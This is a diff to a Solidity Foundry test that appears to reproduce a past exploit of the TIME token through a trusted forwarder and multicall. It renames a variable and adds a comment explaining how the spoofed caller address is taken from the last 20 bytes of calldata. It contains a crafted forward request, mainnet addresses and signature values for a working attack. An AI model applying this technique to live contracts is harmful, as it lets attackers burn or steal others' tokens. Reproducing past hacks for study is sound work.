@@ -48,7 +48,7 @@ contract ContractTest is Test {
         Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
     IForwarder private constant Forwarder =
         IForwarder(0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81);
-    address private constant victimAddress =
+    address private constant recoverAddr =
         0xa16A5F37774309710711a8B4E83b068306b21724;
 
     function setUp() public {
@@ -58,7 +58,7 @@ contract ContractTest is Test {
         vm.label(address(TIME_WETH), "TIME_WETH");
         vm.label(address(Router), "Router");
         vm.label(address(Forwarder), "Forwarder");
-        vm.label(address(victimAddress), "victimAddress");
+        vm.label(recoverAddr, "recoverAddr");
     }
 
     function testExploit() public {
@@ -78,7 +78,7 @@ contract ContractTest is Test {
         datas[0] = abi.encodePacked(
             TIME.burn.selector,
             amountToBurn,
-            address(TIME_WETH)
+            address(TIME_WETH) // This will be caller's address (extracted from the last 20 bytes of the calldata)
         );
         bytes memory data = abi.encodeWithSelector(
             TIME.multicall.selector,
@@ -86,7 +86,7 @@ contract ContractTest is Test {
         );
 
         IForwarder.ForwardRequest memory request = IForwarder.ForwardRequest({
-            from: victimAddress,
+            from: recoverAddr,
             to: address(TIME),
             value: 0,
             gas: 5e6,
@@ -99,7 +99,7 @@ contract ContractTest is Test {
         bytes32 r = 0x9194983a3dbfb5779c09c95f5d830d8435d9ce88b383752c3dfb8a1b84b8c9f5;
         bytes32 s = 0x11b7c750f1334e2f26ca9be32c2d070a4a023edf745b02468d6cba9a15a494c6;
         uint8 v = 27;
-        assertEq(ecrecover(messageHash, v, r, s), victimAddress);
+        assertEq(ecrecover(messageHash, v, r, s), recoverAddr);
         bytes memory signature = abi.encodePacked(r, s, v);
 
         // Start exploit here
